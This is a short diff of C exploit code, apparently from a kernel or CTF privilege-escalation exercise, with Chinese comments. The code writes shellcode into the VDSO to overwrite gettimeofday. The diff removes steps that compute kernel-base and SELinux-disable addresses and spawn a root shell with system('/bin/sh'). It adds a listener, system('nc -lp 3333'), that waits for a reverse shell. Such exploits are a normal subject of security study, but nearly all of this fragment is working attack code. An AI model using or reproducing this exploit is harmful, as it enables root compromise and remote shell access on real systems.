@@ -151,27 +151,11 @@ int main()
 	// shellcode写到VDSO,覆盖gettimeofday
 	write_mem(fd,result+0xc80, shellcode,strlen(shellcode));    //  $ objdump xxx -T  查看gettimeofday代码偏移
 
-
-	    // 根据VDSO地址得到 kernel_base 
-    kernel_base=result & 0xffffffffff000000;
-    selinux_disable_addr+=kernel_base;
-    prctl_hook+=kernel_base;
-    order_cmd+=kernel_base;
-    poweroff_work_addr+=kernel_base;
-    printf("[+] found kernel_base: %p\n",kernel_base);
-    printf("[+] found prctl_hook: %p\n",prctl_hook);
-    printf("[+] found order_cmd: %p\n",order_cmd);
-    printf("[+] found selinux_disable_addr: %p\n",selinux_disable_addr);
-    printf("[+] found poweroff_work_addr: %p\n",poweroff_work_addr);
-	if (getuid()==0)
+	if (check_vdso_shellcode(shellcode)!=0)
 	{
-		printf("[+] Congratulations! You get root shell !!! [+]\n");
-		system("/bin/sh");
+		printf("[+] Shellcode is written into vdso, waiting for reverse shell :\n");
+		system("nc -lp 3333");
 	}
-	//if (check_vdso_shellcode(shellcode)!=0)
-	//{
-
-	//}
 	else
 	{
 		puts("[-] There are something wrong!\n");
